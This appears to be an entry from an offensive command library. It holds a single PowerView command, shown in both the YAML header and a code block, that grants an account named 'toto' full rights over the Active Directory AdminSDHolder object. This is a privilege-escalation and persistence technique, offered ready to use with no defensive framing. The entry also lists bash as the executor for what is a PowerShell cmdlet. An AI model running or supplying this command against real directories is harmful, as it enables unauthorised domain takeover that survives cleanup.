---
id: ab65e703-74ba-4004-beba-ad0a1f855fc1
name: Give all rights
type: command
executor: bash
data: Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName
  toto -Verbose -Rights All
output: null
created_at: '2023-04-06T03:56:06.430470+00:00'
updated_at: '2023-04-10T20:26:37.633229+00:00'
---

# Give all rights

```bash
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
```


